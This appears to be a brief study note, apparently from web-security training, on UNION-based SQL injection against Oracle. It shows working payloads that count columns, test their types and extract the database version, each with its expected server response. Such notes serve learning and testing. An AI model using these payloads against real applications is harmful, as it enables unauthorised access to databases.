## Querying the database type and version

+ Microsoft, MySQL
`select @@version`

+ Oracle
` select * from v$version`

+ PostgreSQL
` select version()`

You can use a **UNION** attack with above queries.  

# For Oracle Database:  
1. Determine the number of columns  
`' order by 1 --`  
-> 200 OK: we have one or more columns  
`' order by 2 --`  
-> 200 OK: we have two or moer columns  
`' order by 3 --`  
-> 500 error: we have less than 3 columns

2. Determine the data types of columns  
` ' union select 'a', 'a' from DUAL--`  
-> 200 OK: the two columns are both string type.  
-- In Oracle database, select statement must have a 'from' clause.  
-- DUAL is a dummy table.    

3. Output the version of the database  
 ` ' union select banner, NULL from v$version --`  
 -> 200 OK: and you will find the version info in the context.  
 -- NULL is a placeholder as this database as two columns.  
